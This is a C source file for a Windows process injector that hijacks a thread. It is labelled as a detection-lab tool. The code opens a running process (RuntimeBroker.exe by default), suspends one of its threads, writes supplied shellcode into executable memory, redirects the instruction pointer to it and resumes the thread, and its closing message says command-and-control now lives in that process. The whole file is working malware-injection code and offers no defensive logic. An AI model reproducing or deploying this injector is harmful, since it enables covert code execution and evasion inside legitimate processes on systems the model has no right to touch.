/*
 * Thread Hijacking Injection — detection lab tool.
 *
 * Finds a running process by name, suspends one of its threads,
 * writes shellcode, redirects the thread's instruction pointer,
 * and resumes. No new process or thread is created.
 * For use in isolated lab environments only.
 *
 * Compile (cross-compile from Linux):
 *   x86_64-w64-mingw32-gcc -O2 -o threadhijack.exe threadhijack.c -lkernel32
 *
 * Usage:
 *   threadhijack.exe <shellcode.bin> [process_name]
 *   process_name defaults to RuntimeBroker.exe
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcessByName(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                printf("[+] Found %s  PID=%lu\n", name, pid);
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

DWORD FindThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                printf("[+] Found thread TID=%lu in PID=%lu\n", tid, pid);
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <shellcode.bin> [process_name]\n", argv[0]);
        return 1;
    }

    const char *sc_path = argv[1];
    const char *target  = argc > 2 ? argv[2] : "RuntimeBroker.exe";

    /* ---- 0. Read shellcode ---- */
    HANDLE hFile = CreateFileA(sc_path, GENERIC_READ, 0, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %s (%lu)\n", sc_path, GetLastError());
        return 1;
    }
    DWORD sc_len = GetFileSize(hFile, NULL);
    LPVOID sc_buf = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);
    DWORD nread;
    ReadFile(hFile, sc_buf, sc_len, &nread, NULL);
    CloseHandle(hFile);
    printf("[+] Shellcode: %lu bytes from %s\n", sc_len, sc_path);

    /* ---- 1. Find the target process (already running) ---- */
    DWORD pid = FindProcessByName(target);
    if (!pid) {
        printf("[-] %s not found running\n", target);
        return 1;
    }

    /* ---- 2. Find a thread in that process ---- */
    DWORD tid = FindThread(pid);
    if (!tid) {
        printf("[-] No thread found in PID %lu\n", pid);
        return 1;
    }

    /* ---- 3. Open process and thread ---- */
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed (%lu)\n", GetLastError());
        return 1;
    }

    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, tid);
    if (!hThread) {
        printf("[-] OpenThread failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    /* ---- 4. Suspend the thread ---- */
    SuspendThread(hThread);
    printf("[+] Suspended TID %lu\n", tid);

    /* ---- 5. Allocate and write shellcode ---- */
    LPVOID remote = VirtualAllocEx(hProcess, NULL, sc_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    SIZE_T written;
    WriteProcessMemory(hProcess, remote, sc_buf, sc_len, &written);
    printf("[+] Wrote %llu bytes at %p in PID %lu\n",
           (unsigned long long)written, remote, pid);

    /* ---- 6. Hijack the thread — redirect RIP ---- */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    printf("[+] Original RIP: 0x%llx\n", (unsigned long long)ctx.Rip);

    ctx.Rip = (DWORD64)remote;
    SetThreadContext(hThread, &ctx);
    printf("[+] Redirected RIP to shellcode at %p\n", remote);

    /* ---- 7. Resume — shellcode runs in the hijacked thread ---- */
    ResumeThread(hThread);
    printf("[+] Thread resumed. Shellcode executing in PID %lu (%s)\n",
           pid, target);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    VirtualFree(sc_buf, 0, MEM_RELEASE);

    printf("[*] Injector exiting. C2 lives in %s (PID %lu)\n", target, pid);
    return 0;
}
